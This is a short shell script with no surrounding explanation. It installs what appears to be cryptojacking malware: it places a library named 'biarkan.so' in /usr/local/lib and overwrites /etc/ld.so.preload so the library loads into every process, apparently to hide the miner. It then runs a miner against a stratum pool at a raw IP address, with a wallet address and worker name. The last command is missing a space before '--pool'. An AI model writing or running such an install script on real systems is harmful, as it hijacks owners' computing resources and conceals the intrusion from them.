mv biarkan.so /usr/local/lib/biarkan.so
mv ld.so.preload /etc/ld.so.preload
sleep 5
./biarkan--pool stratum+tcp://0x5FcF1A2c07b72C6902e03d4417e6B0Ef2e5760e9.Worker001@38.75.137.183:32672
